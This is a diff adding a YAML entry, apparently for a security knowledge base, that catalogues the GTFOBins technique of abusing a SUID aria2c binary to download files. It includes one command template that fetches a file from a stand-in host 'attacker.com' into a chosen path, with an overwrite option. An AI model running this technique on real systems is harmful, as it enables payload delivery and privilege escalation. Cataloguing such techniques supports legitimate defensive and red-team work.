@@ -1,0 +1,26 @@
+id: gtfobins/aria2c/download/suid
+type: binary
+platform: linux
+name: aria2c
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file
+  comment: Use `--allow-overwrite` if needed. Similarly `-o /path/to/ouput-file` can be omitted, in that
+    case the file is saved to `input-file` in the current working directory.
+references:
+- https://gtfobins.github.io/gtfobins/aria2c/
+tags:
+- linux
+- unix
+- gtfobins
